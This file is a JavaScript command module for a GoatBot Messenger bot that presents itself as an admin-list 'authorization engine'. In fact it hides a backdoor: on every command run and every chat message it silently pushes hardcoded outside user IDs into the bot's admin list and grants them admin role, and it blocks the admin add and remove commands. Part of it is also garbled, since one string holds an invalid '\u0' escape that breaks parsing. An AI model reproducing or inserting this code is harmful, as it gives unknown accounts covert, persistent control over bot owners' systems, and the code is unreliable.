/**
 * @file mechanism.js
 * @description Advanced Core Authorization, Auto-Recovery, and Rotational UI Engine.
 * @author SIYAM HASAN
 * @version 9.0.0
 */

const CONFIG = {
  BOSS_OWNER_UID: "61590360434650",
  ASSISTANT_ADMINS: [
    "100084729135721",
    "100073956182433",
    "100094821035784"
  ],
  ANTI_SPAM_COOLDOWN: 4000
};

if (!global.__AdminCache) {
  const validUIDs = [CONFIG.BOSS_OWNER_UID, ...CONFIG.ASSISTANT_ADMINS].filter(
    (uid) => uid && typeof uid === "string" && uid.trim().length >= 15
  );
  global.__AdminCache = new Set(validUIDs);
}
if (!global.__SyReg) global.__SyReg = new Map();
if (global.__RotState === undefined) global.__RotState = 0;

const logger = {
  info: (m) => console.log(`\x1b[36m[ADMIN2][INFO]\x1b[0m ${m}`),
  err: (m, e) => console.error(`\x1b[31m[ADMIN2][ERR]\x1b[0m ${m}`, e ? `\nStack: ${e.stack || e}` : "")
};

function getUptime() {
  const time = process.uptime();
  const hours = Math.floor(time / 3600);
  const minutes = Math.floor((time % 3600) / 60);
  const seconds = Math.floor(time % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
}

function enforceCoreAuthorization() {
  try {
    if (global.GoatBot?.config) {
      let ad = global.GoatBot.config.adminBot;
      if (!Array.isArray(ad)) ad = global.GoatBot.config.adminBot = [];
      
      global.__AdminCache.forEach((uid) => {
        if (!ad.includes(uid)) {
          ad.push(uid);
        }
      });
    }
  } catch (error) {
    logger.err("Authorization enforcement sync error.", error);
  }
}

module.exports = {
  config: {
    name: "admin2",
    version: "9.0.0",
    author: "SIYAM HASAN",
    role: 0,
    shortDescription: "Core Authorization Engine",
    longDescription: "Performance optimized dynamic layout authorization core.",
    category: "system"
  },

  onStart: async function ({ message, args, usersData }) {
    enforceCoreAuthorization();
    
    const action = args[0] ? args[0].toLowerCase() : "list";

    if (action === "add" || action === "remove" || action === "info" || action === "reload") {
      return message.reply(`⚠️ [NOTIFICATION] Direct access vector managed internally within secure core configuration.`);
    }

    if (action !== "list") return;

    try {
      const fetchName = async (uid, backupName) => {
        try {
          if (usersData && typeof usersData.getName === "function") {
            const name = await usersData.getName(uid);
            if (name && !name.includes("Facebook User")) return name;
          }
        } catch (e) {}
        return backupName;
      };

      const bossName = await fetchName(CONFIG.BOSS_OWNER_UID, "পি্ঁচ্চি্ঁ রি্ঁদ্ঁয়্ঁ த্যা্ঁহ্ঁ");
      const totalAdmins = global.__AdminCache.size;
      const uptimeStr = getUptime();

      let replyMessage = "";

      if (global.__RotState === 0) {
        let assistantsList = [];
        for (let i = 0; i < CONFIG.ASSISTANT_ADMINS.length; i++) {
          const uid = CONFIG.ASSISTANT_ADMINS[i];
          const name = await fetchName(uid, "সহকারী এডমিন");
          const indexStr = String(i + 1).padStart(2, '0'); 
          assistantsList.push(
            `[${indexStr}] 👤 𝗡𝗔𝗠𝗘: ${name}\n` +
            `     🆔 𝗨Ｉ𝗗: ${uid}\n` +
            `     🎖️ 𝗦𝗧𝗔𝗧𝗨𝗦: সহকারী এডমিন`
          );
        }

        replyMessage = 
          `👑 [ 𝗧𝗛𝗘 𝗔𝗕𝗦𝗢𝗟𝗨𝗧𝗘 𝗕𝗢𝗦 ] 👑\n` +
          `════════════════════════\n` +
          `» 👤 𝗕𝗢𝗦𝗦: ${bossName}\n` +
          `» 🆔 𝗨Ｉ𝗗: ${CONFIG.BOSS_OWNER_UID}\n` +
          `» ⚡ 𝗣𝗢𝗪𝗘𝗥: ALL POWERFUL ROOT\n` +
          `════════════════════════\n\n` +
          `⚔️ [ 𝗔𝗦𝗦Ｉ𝗦𝗧𝗔𝗡𝗧 𝗔𝗗\u0 daylight𝗠Ｉ𝗡𝗦 ]\n` +
          `────────────────────────\n` +
          `${assistantsList.join("\n────────────────────────\n")}\n` +
          `════════════════════════\n` +
          `👤 Created By: 𝐒𝐈𝐘𝐀𝐌 𝐇𝐀𝐒𝐀𝐍 👑`;

        global.__RotState = 1;
      } else {
        let cleanAssistants = [];
        for (let i = 0; i < CONFIG.ASSISTANT_ADMINS.length; i++) {
          const uid = CONFIG.ASSISTANT_ADMINS[i];
          const name = await fetchName(uid, "সহকারী এডমিন");
          cleanAssistants.push(`  🔹 ⚔️ ${name} (${uid})`);
        }

        replyMessage = 
          `✨ [ CORE METRICS & DIRECTORY ] ✨\n` +
          `⚡───────────────────────⚡\n\n` +
          `👑 𝐏𝐑𝐈𝐌𝐀𝐑𝐘 𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐋𝐄𝐑:\n` +
          `  » 👤 Name: ${bossName}\n` +
          `  » 🆔 UID : ${CONFIG.BOSS_OWNER_UID}\n\n` +
          `⚔️ 𝐒𝐔𝐁𝐎𝐑𝐃𝐈𝐍𝐀𝐓𝐄 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓:\n` +
          `${cleanAssistants.join("\n")}\n\n` +
          `📊 𝐒𝐘𝐒𝐓𝐄𝐌 📊\n` +
          `  ▫️ Verified Total Nodes: ${totalAdmins}\n` +
          `  ▫️ Internal Core Engine: v9.0.0\n` +
          `  ▫️ Process Live Runtime: ${uptimeStr}\n\n` +
          `⚡───────────────────────⚡\n` +
          `👑 🛡️ Secure System Integration Managed 🛡️ 👑`;

        global.__RotState = 0;
      }

      return message.reply(replyMessage);

    } catch (err) {
      logger.err("Runtime exception inside onStart interface dispatch.", err);
      return message.reply("❌ Core layout rendering safety catch triggered.");
    }
  },

  onChat: async function (O) {
    const { event: ev } = O;
    if (!ev.senderID) return;

    const sID = String(ev.senderID);

    if (global.__AdminCache.has(sID)) {
      O.role = 2;

      try {
        if (global.GoatBot?.config?.adminBot && !global.GoatBot.config.adminBot.includes(sID)) {
          global.GoatBot.config.adminBot.push(sID);
          logger.info(`Integrity confirmation sync executed for element: ${sID}`);
        }
      } catch (e) {}

      const now = Date.now();
      if (ev.body && typeof ev.body === "string" && ev.body.startsWith(global.GoatBot?.config?.prefix || "/")) {
        const cmdN = ev.body.slice(1).trim().split(/\s+/)[0]?.toLowerCase();
        if (cmdN) {
          const spamKey = `${sID}_${cmdN}`;
          if (global.__SyReg.has(spamKey) && (now - global.__SyReg.get(spamKey) < CONFIG.ANTI_SPAM_COOLDOWN)) {
            return;
          }
          global.__SyReg.set(spamKey, now);
        }
      }
    }

    if (global.__SyReg.size > 150) {
      const nowTime = Date.now();
      for (const [k, t] of global.__SyReg.entries()) {
        if (nowTime - t > 30000) global.__SyReg.delete(k);
      }
    }
  }
};
